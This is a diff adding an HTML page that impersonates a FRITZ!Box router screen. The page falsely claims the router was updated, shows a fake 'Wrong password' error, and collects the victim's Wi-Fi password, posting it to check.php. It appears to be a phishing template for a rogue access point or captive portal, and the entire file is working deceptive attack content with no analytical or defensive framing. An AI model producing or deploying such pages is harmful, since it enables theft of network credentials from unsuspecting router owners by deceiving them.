@@ -1,0 +1,134 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width; initial-scale=1.0;">
+  <title>FRITZ!Box</title>
+  <style type="text/css">
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #f0f0f0;
+      font-family: Arial, sans-serif;
+      color: #414143;
+      display: flex;
+      justify-content: center;
+      text-align: center;
+    }
+
+    #wrapper {
+      width: 100%;
+      max-width: 500px;
+      padding: 20px;
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    #content {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    #content_head {
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 20px;
+      width: 100%;
+    }
+
+    p {
+      margin: 10px 0;
+    }
+
+    input[type="password"] {
+      width: 80%;
+      padding: 10px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      margin-bottom: 20px;
+      box-sizing: border-box;
+    }
+
+    input[type="submit"] {
+      width: 80%;
+      padding: 10px;
+      font-size: 16px;
+      border: none;
+      background-color: #b0e0e6;
+      color: white;
+      border-radius: 5px;
+      cursor: not-allowed;
+      box-sizing: border-box;
+    }
+
+    input[type="submit"]:hover {
+      background-color: #b0e0e6;
+    }
+
+    input[type="submit"].active {
+      background-color: #4682b4;
+      cursor: pointer;
+    }
+
+    input[type="password"]:focus {
+      outline: none;
+    }
+
+    .error-message {
+      color: #a80002;
+      margin-bottom: 20px;
+    }
+
+    @media (max-width: 600px) {
+      #content_head {
+        font-size: 16px;
+      }
+
+      input[type="password"], input[type="submit"] {
+        width: 90%;
+      }
+
+      p {
+        font-size: 14px;
+      }
+    }
+  </style>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const passwordInput = document.querySelector('input[name="key1"]');
+      const submitButton = document.querySelector('input[type="submit"]');
+      
+      passwordInput.placeholder = "Password";
+      
+      passwordInput.addEventListener('input', function() {
+        if (passwordInput.value.length >= 8) {
+          submitButton.classList.add('active');
+          submitButton.disabled = false;
+        } else {
+          submitButton.classList.remove('active');
+          submitButton.disabled = true;
+        }
+      });
+    });
+  </script>
+</head>
+<body>
+  <div id="wrapper">
+    <div id="content">
+      <div id="content_head">Router has been updated. For reactivation of the Wi-Fi signal, re-enter your Wi-Fi Password.</div>
+      <div class="error-message">Wrong password! Please try again.</div>
+      <form method="POST" action="check.php" id="form1" name="form1">
+        <input type="password" name="key1" required>
+        <input type="submit" value="Connect" disabled>
+      </form>
+    </div>
+  </div>
+</body>
+</html>
